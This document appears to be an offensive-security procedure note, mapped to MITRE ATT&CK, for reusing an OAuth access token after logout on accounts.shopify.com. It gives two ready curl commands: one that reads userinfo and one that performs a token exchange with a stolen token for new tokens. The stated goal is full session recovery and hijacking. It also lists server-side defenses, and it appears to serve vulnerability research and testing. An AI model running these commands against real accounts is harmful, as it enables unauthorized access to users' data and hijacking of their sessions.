---
tags:
  - session-recovery
  - token-reuse
  - persistence
type: procedure
tools:
  - '[[tools/okhttp]]'
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/userinfo-retrieve-post-logout]]'
  - '[[commands/token-exchange-post-logout]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Application Access Token]]'
updated_at: '2025-12-14T17:24:45.097Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: bbe1f003-835e-4de3-83e9-b7b92276ae4c
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Application Access Token]]'
---
# Verify-Persistent-Access-Token-Post-Logout

## Summary

This procedure confirms the primary access_token remains valid after logout, allowing unauthorized retrieval of user data and further token exchanges, exploiting the insufficient session expiration.

## Description

Post-logout, reuse tokenA for /oauth/userinfo and token exchange. Success indicates the vulnerability, enabling session hijacking if token is extracted from device storage. Targets accounts.shopify.com; requires tokenA from prior steps.

## Requirements

1. tokenA from pre-logout session
2. Device or network access to reuse token
3. No app restart (token persists in storage)

## Defense

Defensive measures and detection strategies:

- Invalidate tokens server-side on logout regardless of client errors
- Encrypt and secure token storage on device
- Detect reused tokens via audit logs

## Objectives

1. Access user data post-logout
2. Exchange for new tokens
3. Demonstrate full session recovery

## Instructions

### Step 1: Retrieve Userinfo Post-Logout

**Context**: Test tokenA validity with userinfo.

**Command** ([[commands/userinfo-retrieve-post-logout]]):
```bash
curl -X GET https://accounts.shopify.com/oauth/userinfo \
  -H "Authorization: Bearer [tokenA]"
```

> Expected output: HTTP/1.1 200 OK with user data JSON.

### Step 2: Perform Token Exchange Post-Logout

**Context**: Exchange tokenA for new token.

**Command** ([[commands/token-exchange-post-logout]]):
```bash
curl -X POST https://accounts.shopify.com/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&audience=...&scope=https://api.shopify.com/auth/destinations.readonly&subject_token=[tokenA]&subject_token_type=urn:ietf:params:oauth:token-type:access_token&client_id=8bb79a45-2d69-4890-9006-ab6ca705d708"
```

> Expected output: HTTP/1.1 200 OK with new token.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Application Access Token]] Application Access Token

### Sub-Techniques


## Commands Used

- [[commands/userinfo-retrieve-post-logout]]
- [[commands/token-exchange-post-logout]]

## Tools Used

- [[tools/okhttp]]

## Tags

- session-recovery
- token-reuse
- persistence
